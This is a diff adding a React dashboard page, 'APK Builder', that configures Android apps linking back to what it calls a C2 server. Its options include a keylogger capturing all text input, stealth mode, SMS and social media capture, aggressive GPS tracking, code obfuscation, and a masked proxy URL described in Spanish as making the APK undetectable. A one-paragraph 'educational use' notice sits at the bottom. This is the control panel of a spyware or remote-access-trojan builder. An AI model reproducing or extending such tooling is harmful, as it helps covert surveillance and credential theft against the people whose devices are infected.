@@ -1,0 +1,841 @@
+// @ts-nocheck
+import { useState, useEffect } from "react";
+import DashboardLayout from "@/components/DashboardLayout";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import {
+  Card,
+  CardContent,
+  CardDescription,
+  CardHeader,
+  CardTitle,
+} from "@/components/ui/card";
+import { Switch } from "@/components/ui/switch";
+import {
+  Code,
+  Download,
+  Settings,
+  Zap,
+  Lock,
+  Eye,
+  Package,
+  Plus,
+  Trash2,
+  Copy,
+  Check,
+  FileText,
+  Smartphone,
+  Shield,
+} from "lucide-react";
+import { toast } from "sonner";
+import { trpc } from "@/lib/trpc";
+
+interface ApkConfig {
+  appName: string;
+  packageName: string;
+  versionName: string;
+  versionCode: number;
+  stealthMode: boolean;
+  sslEnabled: boolean;
+  ports: number[];
+  serverUrl: string;
+  iconUrl: string;
+  enableKeylogger?: boolean;
+  enableActiveTracking?: boolean;
+  enableAccessibilityMonitor?: boolean;
+  obfuscate?: boolean;
+  advancedObfuscation?: boolean;
+  targetArchitectures?: string[];
+}
+
+export default function ApkBuilder() {
+  const [activeTab, setActiveTab] = useState("basic");
+  const [config, setConfig] = useState<ApkConfig>({
+    appName: "Android Manager",
+    packageName: "com.example.manager",
+    versionName: "1.0.0",
+    versionCode: 1,
+    stealthMode: false,
+    sslEnabled: true,
+    ports: [8080],
+    serverUrl: "",
+    iconUrl: "",
+    enableKeylogger: false,
+    enableActiveTracking: false,
+    enableAccessibilityMonitor: false,
+    obfuscate: false,
+    advancedObfuscation: false,
+    targetArchitectures: ["arm64-v8a", "armeabi-v7a"],
+  });
+  const [newPort, setNewPort] = useState("");
+  const [copiedBuildId, setCopiedBuildId] = useState<string | null>(null);
+  const [viewingLogsFor, setViewingLogsFor] = useState<string | null>(null);
+
+  const utils = trpc.useUtils();
+  const { data: builds = [], isLoading } = trpc.apk.listBuilds.useQuery({ limit: 50 });
+
+  // Poll for build status/logs every 5 seconds if a build is in progress
+  useEffect(() => {
+    // Detect server IP from health check
+    fetch("/api/health")
+      .then(res => res.json())
+      .then(data => {
+        if (data.serverUrl && !config.serverUrl) {
+          setConfig(prev => ({ ...prev, serverUrl: data.serverUrl }));
+        }
+      })
+      .catch(() => {});
+
+    let interval: NodeJS.Timeout;
+    const hasActiveBuild = builds?.some(b => b.status === "building");
+    
+    if (hasActiveBuild) {
+      interval = setInterval(() => {
+        utils.apk.listBuilds.invalidate();
+      }, 5000);
+    }
+    
+    return () => {
+      if (interval) clearInterval(interval);
+    };
+  }, [builds, utils.apk.listBuilds]);
+
+  const buildApkMutation = trpc.apk.buildAPK.useMutation({
+    onSuccess: () => {
+      toast.success("Build started! Check 'Builds' tab for status.");
+      utils.apk.listBuilds.invalidate();
+      setActiveTab("builds");
+    },
+    onError: (err) => {
+      toast.error(`Build failed: ${err.message}`);
+    },
+  });
+
+  const deleteBuildMutation = trpc.apk.deleteBuild.useMutation({
+    onSuccess: () => {
+      toast.success("Build deleted");
+      utils.apk.listBuilds.invalidate();
+    },
+  });
+
+  const handleAddPort = () => {
+    const port = parseInt(newPort);
+    if (!newPort || isNaN(port) || port < 1 || port > 65535) {
+      toast.error("Invalid port number (1-65535)");
+      return;
+    }
+    if (config.ports.includes(port)) {
+      toast.error("Port already added");
+      return;
+    }
+    setConfig({
+      ...config,
+      ports: [...config.ports, port],
+    });
+    setNewPort("");
+  };
+
+  const handleRemovePort = (port: number) => {
+    setConfig({
+      ...config,
+      ports: config.ports.filter((p) => p !== port),
+    });
+  };
+
+  const handleBuildApk = async () => {
+    if (!config.appName || !config.packageName) {
+      toast.error("App Name and Package Name are required");
+      return;
+    }
+    if (!config.serverUrl) {
+      toast.error("Server URL/Host is required");
+      return;
+    }
+    if (config.ports.length === 0) {
+      toast.error("At least one port is required");
+      return;
+    }
+
+    try {
+      new URL(config.serverUrl);
+    } catch (e) {
+      toast.error("Invalid Server URL (must include http/https)");
+      return;
+    }
+
+    await buildApkMutation.mutateAsync(config);
+  };
+
+  const copyToClipboard = (text: string, buildId: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedBuildId(buildId);
+    setTimeout(() => setCopiedBuildId(null), 2000);
+  };
+
+  const validatePackageName = (name: string) => {
+    const regex = /^[a-z][a-z0-9_]*(\.[a-z0-9_]+)*$/;
+    return regex.test(name);
+  };
+
+  return (
+    <DashboardLayout title="APK Builder">
+      <div className="space-y-6">
+        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
+          <TabsList className="grid w-full grid-cols-3 bg-card border-glow-cyan">
+            <TabsTrigger value="basic" className="data-[state=active]:bg-accent/20">
+              <Settings className="w-4 h-4 mr-2" />
+              Basic Config
+            </TabsTrigger>
+            <TabsTrigger value="advanced" className="data-[state=active]:bg-accent/20">
+              <Zap className="w-4 h-4 mr-2" />
+              Advanced
+            </TabsTrigger>
+            <TabsTrigger value="builds" className="data-[state=active]:bg-accent/20">
+              <Package className="w-4 h-4 mr-2" />
+              Builds
+            </TabsTrigger>
+          </TabsList>
+
+          {/* Basic Configuration Tab */}
+          <TabsContent value="basic" className="space-y-6">
+            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+              {/* Left Column - Basic Info */}
+              <div className="space-y-6">
+                <div className="card-neon">
+                  <h3 className="text-lg font-bold mb-4 glow-cyan">Application Info</h3>
+                  <div className="space-y-4">
+                    <div>
+                      <label className="text-sm font-medium glow-cyan mb-2 block">
+                        App Name
+                      </label>
+                      <Input
+                        placeholder="e.g., Android Manager"
+                        value={config.appName}
+                        onChange={(e) =>
+                          setConfig({ ...config, appName: e.target.value })
+                        }
+                        className="input-neon"
+                      />
+                      <p className="text-xs text-muted-foreground mt-1">
+                        The name displayed on the device
+                      </p>
+                    </div>
+                    <div>
+                      <label className="text-sm font-medium glow-cyan mb-2 block">
+                        Package Name
+                      </label>
+                      <Input
+                        placeholder="e.g., com.example.manager"
+                        value={config.packageName}
+                        onChange={(e) =>
+                          setConfig({ ...config, packageName: e.target.value })
+                        }
+                        className={`input-neon ${
+                          config.packageName &&
+                          !validatePackageName(config.packageName)
+                            ? "border-red-500"
+                            : ""
+                        }`}
+                      />
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Format: com.company.app (lowercase letters, numbers, dots)
+                      </p>
+                      {config.packageName &&
+                        !validatePackageName(config.packageName) && (
+                          <p className="text-xs text-red-400 mt-1">
+                            Invalid package name format
+                          </p>
+                        )}
+                    </div>
+                    <div className="grid grid-cols-2 gap-4">
+                      <div>
+                        <label className="text-sm font-medium glow-cyan mb-2 block">
+                          Version Name
+                        </label>
+                        <Input
+                          placeholder="e.g., 1.0.0"
+                          value={config.versionName}
+                          onChange={(e) =>
+                            setConfig({ ...config, versionName: e.target.value })
+                          }
+                          className="input-neon"
+                        />
+                      </div>
+                      <div>
+                        <label className="text-sm font-medium glow-cyan mb-2 block">
+                          Version Code
+                        </label>
+                        <Input
+                          type="number"
+                          min="1"
+                          value={config.versionCode}
+                          onChange={(e) =>
+                            setConfig({
+                              ...config,
+                              versionCode: parseInt(e.target.value) || 1,
+                            })
+                          }
+                          className="input-neon"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Icon Configuration */}
+                <div className="card-neon-cyan">
+                  <h3 className="text-lg font-bold mb-4 glow-cyan">App Icon</h3>
+                  <div className="space-y-4">
+                    <div>
+                      <label className="text-sm font-medium glow-cyan mb-2 block">
+                        Icon URL
+                      </label>
+                      <Input
+                        placeholder="https://example.com/icon.png"
+                        value={config.iconUrl}
+                        onChange={(e) =>
+                          setConfig({ ...config, iconUrl: e.target.value })
+                        }
+                        className="input-neon"
+                      />
+                      <p className="text-xs text-muted-foreground mt-1">
+                        PNG image (512x512px recommended)
+                      </p>
+                    </div>
+                    {config.iconUrl && (
+                      <div className="border-glow-cyan p-4 rounded flex items-center justify-center">
+                        <img
+                          src={config.iconUrl}
+                          alt="App Icon Preview"
+                          className="w-24 h-24 rounded"
+                          onError={() => {
+                            toast.error("Failed to load icon");
+                          }}
+                        />
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </div>
+
+              {/* Right Column - Preview */}
+              <div className="card-neon">
+                <h3 className="text-lg font-bold mb-4 glow-cyan">Configuration Preview</h3>
+                <div className="space-y-3 text-sm">
+                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
+                    <span className="text-muted-foreground">App Name:</span>
+                    <span className="font-bold">{config.appName || "—"}</span>
+                  </div>
+                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
+                    <span className="text-muted-foreground">Package:</span>
+                    <span className="font-mono text-xs">{config.packageName || "—"}</span>
+                  </div>
+                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
+                    <span className="text-muted-foreground">Version:</span>
+                    <span className="font-bold">
+                      {config.versionName} ({config.versionCode})
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
+                    <span className="text-muted-foreground">Ports:</span>
+                    <span className="font-mono text-xs">
+                      {config.ports.join(", ") || "—"}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
+                    <span className="text-muted-foreground">SSL/TLS:</span>
+                    <span
+                      className={config.sslEnabled ? "text-green-400" : "text-yellow-400"}
+                    >
+                      {config.sslEnabled ? "Enabled" : "Disabled"}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between p-3 bg-accent/10 rounded">
+                    <span className="text-muted-foreground">Stealth Mode:</span>
+                    <span
+                      className={config.stealthMode ? "text-purple-400" : "text-gray-400"}
+                    >
+                      {config.stealthMode ? "Enabled" : "Disabled"}
+                    </span>
+                  </div>
+                </div>
+
+                {/* Build Button */}
+                <Button
+                  onClick={handleBuildApk}
+                  className="btn-neon-cyan w-full mt-6"
+                  disabled={buildApkMutation.isPending}
+                >
+                  {buildApkMutation.isPending ? (
+                    <>
+                      <Zap className="w-4 h-4 mr-2 animate-spin" />
+                      Building...
+                    </>
+                  ) : (
+                    <>
+                      <Code className="w-4 h-4 mr-2" />
+                      Build APK
+                    </>
+                  )}
+                </Button>
+              </div>
+            </div>
+          </TabsContent>
+
+          {/* Advanced Configuration Tab */}
+          <TabsContent value="advanced" className="space-y-6">
+            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+              {/* Security Settings */}
+              <div className="card-neon">
+                <h3 className="text-lg font-bold mb-4 glow-cyan flex items-center gap-2">
+                  <Lock className="w-5 h-5" />
+                  Security Settings
+                </h3>
+                <div className="space-y-4">
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
+                    <div>
+                      <p className="font-medium">SSL/TLS Encryption</p>
+                      <p className="text-sm text-muted-foreground">
+                        Encrypt communication with server
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.sslEnabled}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, sslEnabled: checked })
+                      }
+                    />
+                  </div>
+
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
+                    <div>
+                      <p className="font-medium">Accessibility Monitor</p>
+                      <p className="text-sm text-muted-foreground">
+                        Monitor system permissions and accessibility state
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.enableAccessibilityMonitor}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, enableAccessibilityMonitor: checked })
+                      }
+                    />
+                  </div>
+
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
+                    <div>
+                      <p className="font-medium text-purple-400">Keylogger Service</p>
+                      <p className="text-sm text-muted-foreground">
+                        Capture all text input (requires Accessibility)
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.enableKeylogger}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, enableKeylogger: checked })
+                      }
+                    />
+                  </div>
+
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded border border-purple-500/30">
+                    <div>
+                      <p className="font-medium text-purple-400">Active Intelligence Tracking</p>
+                      <p className="text-sm text-muted-foreground">
+                        Aggressive GPS polling and social media monitoring
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.enableActiveTracking}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, enableActiveTracking: checked })
+                      }
+                    />
+                  </div>
+
+                  <div className="border-glow-cyan p-4 rounded">
+                    <h3 className="font-medium text-amber-500 mb-2 border-b border-amber-900 pb-2">
+                      ⚠️ Enterprise Advanced Features
+                    </h3>
+                    <ul className="text-xs text-muted-foreground space-y-1">
+                      <li>✓ Accessibility-based Keylogger</li>
+                      <li>✓ Real-time Permission Matrix</li>
+                      <li>✓ Stealth SMS & Social Capture</li>
+                      <li>✓ Background GPS Persistence</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+
+              {/* Obfuscation & Security */}
+              <div className="card-neon-cyan">
+                <h3 className="text-lg font-bold mb-4 glow-cyan flex items-center gap-2">
+                  <Code className="w-5 h-5" />
+                  Obfuscation & Security
+                </h3>
+                <div className="space-y-4">
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
+                    <div>
+                      <p className="font-medium text-amber-400">Code Obfuscation (Basic)</p>
+                      <p className="text-sm text-muted-foreground">
+                        Rename classes to single letters (a, b, c...)
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.obfuscate || false}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, obfuscate: checked })
+                      }
+                    />
+                  </div>
+
+                  {config.obfuscate && (
+                    <div className="flex items-center justify-between p-4 bg-accent/10 rounded border border-red-500/30">
+                      <div>
+                        <p className="font-medium text-red-400">Advanced Obfuscation (Pro)</p>
+                        <p className="text-sm text-muted-foreground">
+                          Encrypt strings, remove debug info, obfuscate methods
+                        </p>
+                      </div>
+                      <Switch
+                        checked={config.advancedObfuscation || false}
+                        onCheckedChange={(checked) =>
+                          setConfig({ ...config, advancedObfuscation: checked })
+                        }
+                      />
+                    </div>
+                  )}
+
+                  {config.advancedObfuscation && (
+                    <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
+                      <p className="text-xs text-red-300">
+                        ⚠️ Advanced obfuscation includes: string encryption, method renaming, 
+                        class obfuscation, and removal of debug information.
+                      </p>
+                    </div>
+                  )}
+
+                  <div>
+                    <p className="font-medium text-amber-400 mb-2">Target Architectures</p>
+                    <div className="grid grid-cols-2 gap-2">
+                      {["arm64-v8a", "armeabi-v7a", "x86", "x86_64"].map((arch) => (
+                        <div key={arch} className="flex items-center gap-2">
+                          <Switch
+                            checked={config.targetArchitectures?.includes(arch) || false}
+                            onCheckedChange={(checked) => {
+                              const current = config.targetArchitectures || [];
+                              const newArchs = checked
+                                ? [...current, arch]
+                                : current.filter((a) => a !== arch);
+                              setConfig({ ...config, targetArchitectures: newArchs });
+                            }}
+                          />
+                          <span className="text-sm text-muted-foreground">{arch}</span>
+                        </div>
+                      ))}
+                    </div>
+                    <p className="text-xs text-muted-foreground mt-2">
+                      Note: Multi-ABI requires Android NDK for native compilation
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Network Configuration */}
+              <div className="card-neon-cyan">
+                <h3 className="text-lg font-bold mb-4 glow-cyan flex items-center gap-2">
+                  <Zap className="w-5 h-5" />
+                  Network Configuration
+                </h3>
+                <div className="space-y-4">
+                  <div>
+                    <label className="text-sm font-medium glow-cyan mb-2 block">
+                      Server Connection (Host/IP)
+                    </label>
+                    <div className="space-y-4">
+                      <Input
+                        placeholder="https://your-server.render.com"
+                        value={config.serverUrl}
+                        onChange={(e) =>
+                          setConfig({ ...config, serverUrl: e.target.value })
+                        }
+                        className="input-neon"
+                      />
+                      
+                      {/* Generador de Links de Conexión */}
+                      {config.serverUrl && (
+                        <div className="space-y-3 p-4 bg-black/40 border border-primary/20 rounded-2xl animate-in fade-in slide-in-from-top-2">
+                          <p className="text-[10px] font-black uppercase text-primary/60 tracking-widest mb-2 italic">Formatos de Conexión Disponibles:</p>
+                          
+                          <div className="grid grid-cols-1 gap-2">
+                            {[
+                              { 
+                                label: "PROTOCOLO TÉCNICO", 
+                                value: config.serverUrl.startsWith('http') 
+                                  ? config.serverUrl.replace('http', 'ws') 
+                                  : `wss://${config.serverUrl}`,
+                                icon: <Zap className="w-3 h-3" /> 
+                              },
+                              { 
+                                label: "URL ENMASCARADA (RECOMENDADO PARA OCULTAR RENDER)", 
+                                value: typeof window !== 'undefined' && window.location.hostname !== 'localhost' 
+                                  ? `https://${window.location.hostname}` 
+                                  : config.serverUrl,
+                                icon: <Shield className="w-3 h-3 text-cyan-400" /> 
+                              },
+                              { 
+                                label: "DEEP LINK SAPSAN", 
+                                value: `admhub://${config.serverUrl.replace(/^https?:\/\//, '').replace(/\/$/, '')}`,
+                                icon: <Lock className="w-3 h-3" /> 
+                              }
+                            ].map((link, i) => (
+                              <div key={i} className={`flex items-center justify-between p-2 rounded-xl border transition-all ${i === 1 ? "bg-cyan-500/10 border-cyan-500/30" : "bg-white/5 border-white/5 hover:border-primary/20"}`}>
+                                <div className="flex flex-col">
+                                  <span className={`text-[8px] font-black uppercase tracking-tighter flex items-center gap-1 ${i === 1 ? "text-cyan-400" : "text-slate-500"}`}>
+                                    {link.icon} {link.label}
+                                  </span>
+                                  <span className={`text-[10px] font-mono truncate max-w-[200px] ${i === 1 ? "text-cyan-100" : "text-primary/80"}`}>{link.value}</span>
+                                </div>
+                                <Button 
+                                  size="sm" 
+                                  variant="ghost" 
+                                  className="h-8 w-8 p-0 hover:bg-primary/10 hover:text-primary"
+                                  onClick={() => {
+                                    navigator.clipboard.writeText(link.value);
+                                    if(i === 1) {
+                                      setConfig({ ...config, serverUrl: link.value });
+                                      toast.success("URL Enmascarada aplicada como Host");
+                                    } else {
+                                      toast.success("Copiado al portapapeles");
+                                    }
+                                  }}
+                                >
+                                  {i === 1 ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
+                                </Button>
+                              </div>
+                            ))}
+                          </div>
+                          {typeof window !== 'undefined' && window.location.hostname.includes('vercel') && (
+                             <p className="text-[10px] text-cyan-400/80 mt-2">
+                               * Al usar la URL enmascarada (Vercel proxy), la IP real de Render jamás se escribirá en el APK, haciéndolo indetectable.
+                             </p>
+                          )}
+                        </div>
+                      )}
+                    </div>
+                    <p className="text-xs text-muted-foreground mt-1">
+                      The C2 server address where the APK will connect.
+                    </p>
+                  </div>
+
+                  <div>
+                    <label className="text-sm font-medium glow-cyan mb-2 block">
+                      Communication Ports
+                    </label>
+                    <div className="space-y-2">
+                      <div className="flex gap-2">
+                        <Input
+                          type="number"
+                          min="1"
+                          max="65535"
+                          placeholder="Add port (1-65535)"
+                          value={newPort}
+                          onChange={(e) => setNewPort(e.target.value)}
+                          onKeyPress={(e) => {
+                            if (e.key === "Enter") {
+                              handleAddPort();
+                            }
+                          }}
+                          className="input-neon flex-1"
+                        />
+                        <Button
+                          onClick={handleAddPort}
+                          className="btn-neon-cyan"
+                          size="sm"
+                        >
+                          <Plus className="w-4 h-4" />
+                        </Button>
+                      </div>
+
+                      {config.ports.length > 0 && (
+                        <div className="space-y-2">
+                          {config.ports.map((port) => (
+                            <div
+                              key={port}
+                              className="flex items-center justify-between p-2 bg-accent/10 rounded"
+                            >
+                              <span className="font-mono text-sm">:{port}</span>
+                              <Button
+                                onClick={() => handleRemovePort(port)}
+                                variant="ghost"
+                                size="sm"
+                                className="hover:text-destructive"
+                              >
+                                <Trash2 className="w-4 h-4" />
+                              </Button>
+                            </div>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                    <p className="text-xs text-muted-foreground mt-2">
+                      Multiple ports for redundancy and load balancing
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Security Warning */}
+            <div className="border-2 border-yellow-500 bg-yellow-500/10 p-4 rounded-lg">
+              <p className="text-sm font-medium text-yellow-400 mb-2">
+                ⚠️ Legal & Ethical Notice
+              </p>
+              <p className="text-xs text-muted-foreground">
+                This APK Builder is for educational and authorized testing purposes only.
+                Unauthorized installation on devices without explicit owner consent is illegal
+                and unethical. Users are solely responsible for compliance with applicable laws
+                and regulations.
+              </p>
+            </div>
+          </TabsContent>
+
+          {/* Builds History Tab */}
+          <TabsContent value="builds" className="space-y-6">
+            <div className="card-neon">
+              <h3 className="text-lg font-bold mb-4 glow-cyan">Build History</h3>
+              {isLoading ? (
+                <div className="text-center py-8 text-muted-foreground">
+                  Loading builds...
+                </div>
+              ) : !builds || builds.length === 0 ? (
+                <div className="text-center py-8">
+                  <Package className="w-12 h-12 glow-cyan mx-auto mb-4 opacity-50" />
+                  <p className="text-muted-foreground">No builds yet</p>
+                  <p className="text-sm text-muted-foreground mt-2">
+                    Create your first APK build to see it here
+                  </p>
+                </div>
+              ) : (
+                <div className="space-y-3">
+                  {(builds || []).map((build: any) => (
+                    <div key={build.buildId} className="space-y-4">
+                      <div
+                        className="border-glow-cyan p-4 rounded flex items-start justify-between hover:bg-accent/5 transition-colors"
+                      >
+                        <div className="flex-1">
+                          <div className="flex items-center gap-2 mb-2">
+                            <Package className="w-4 h-4 glow-cyan" />
+                            <h4 className="font-bold">{build.appName}</h4>
+                            <span
+                              className={`text-xs px-2 py-1 rounded ${
+                                build.status === "ready"
+                                  ? "bg-green-500/20 text-green-400"
+                                  : build.status === "building"
+                                  ? "bg-yellow-500/20 text-yellow-400"
+                                  : build.status === "failed"
+                                  ? "bg-red-500/20 text-red-400"
+                                  : "bg-gray-500/20 text-gray-400"
+                              }`}
+                            >
+                              {build.status.toUpperCase()}
+                            </span>
+                          </div>
+                          <p className="text-sm text-muted-foreground font-mono">
+                            {build.packageName}
+                          </p>
+                          <p className="text-xs text-muted-foreground mt-1">
+                            v{build.versionName} • {build.fileSize ? `${(build.fileSize / 1024 / 1024).toFixed(2)} MB` : "—"}
+                          </p>
+                        </div>
+                        <div className="flex items-center gap-2">
+                          <div className="flex items-center gap-2">
+                            {(build.status === "failed" || build.status === "building") && build.buildLogs && (
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                className="border-red-500/50 text-red-400 hover:bg-red-500/10"
+                                onClick={() => setViewingLogsFor(viewingLogsFor === build.buildId ? null : build.buildId)}
+                              >
+                                <FileText className="w-4 h-4 mr-1" />
+                                Logs
+                              </Button>
+                            )}
+                            <Button
+                              size="sm"
+                              variant="ghost"
+                              className="text-destructive hover:bg-destructive/10"
+                              onClick={() => deleteBuildMutation.mutate({ buildId: build.buildId })}
+                              disabled={deleteBuildMutation.isPending}
+                            >
+                              <Trash2 className="w-4 h-4" />
+                            </Button>
+                            {build.status === "ready" && (
+                              <>
+                                <Button
+                                  size="sm"
+                                  className="btn-neon-cyan"
+                                  onClick={() => {
+                                    copyToClipboard(build.apkUrl, build.buildId);
+                                  }}
+                                >
+                                  {copiedBuildId === build.buildId ? (
+                                    <>
+                                      <Check className="w-4 h-4 mr-1" />
+                                      Copied
+                                    </>
+                                  ) : (
+                                    <>
+                                      <Copy className="w-4 h-4 mr-1" />
+                                      URL
+                                    </>
+                                  )}
+                                </Button>
+                                <Button
+                                  size="sm"
+                                  className="btn-neon"
+                                  asChild
+                                >
+                                  <a href={build.apkUrl || "#"} download>
+                                    <Download className="w-4 h-4 mr-1" />
+                                    Get APK
+                                  </a>
+                                </Button>
+                              </>
+                            )}
+                          </div>
+                        </div>
+                      </div>
+
+                      {viewingLogsFor === build.buildId && (
+                        <div className="mt-4 p-4 bg-black/40 border border-glow-cyan rounded-lg overflow-hidden animate-in fade-in slide-in-from-top-2">
+                          <div className="flex items-center justify-between mb-2">
+                            <h5 className="text-sm font-bold glow-cyan flex items-center gap-2">
+                              <FileText className="w-4 h-4" />
+                              Construction Logs
+                            </h5>
+                            <Button 
+                              variant="ghost" 
+                              size="sm" 
+                              className="h-6 w-6 p-0"
+                              onClick={() => setViewingLogsFor(null)}
+                            >
+                              ×
+                            </Button>
+                          </div>
+                          <pre className="text-[10px] font-mono whitespace-pre-wrap break-all max-h-[300px] overflow-y-auto text-white p-2 bg-black/40 rounded border border-white/10">
+                            {build.buildLogs}
+                          </pre>
+                        </div>
+                      )}
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          </TabsContent>
+        </Tabs>
+      </div>
+    </DashboardLayout>
+  );
+}
